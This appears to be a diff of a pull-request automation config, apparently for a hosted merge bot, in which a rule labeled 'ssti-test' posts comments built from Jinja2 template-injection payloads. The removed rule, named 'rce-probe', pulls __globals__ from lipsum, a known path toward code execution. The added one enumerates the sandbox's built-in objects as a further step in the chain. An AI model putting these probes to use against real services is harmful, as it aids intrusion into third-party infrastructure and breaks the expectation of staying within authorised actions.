@@ -1,10 +1,11 @@
 pull_request_rules:
-  - name: rce-probe
+  - name: chain-g1
     conditions:
       - label=ssti-test
     actions:
       comment:
         message: |
-          MODULE={{[lipsum]|map(attribute="__module__")|list}}
-          NAME={{[lipsum]|map(attribute="__name__")|list}}
-          GLOBALS_TYPE={{[lipsum]|map(attribute="__globals__")|list|string|truncate(300)}}
+          JOINER={{joiner()|string}}
+          NS={{namespace()|string}}
+          DICT={{dict(a=1,b=2)}}
+          ITEMS={% for k,v in dict(x=lipsum,y=cycler).items() %}{{k}}={{v|string|truncate(60)}},{% endfor %}
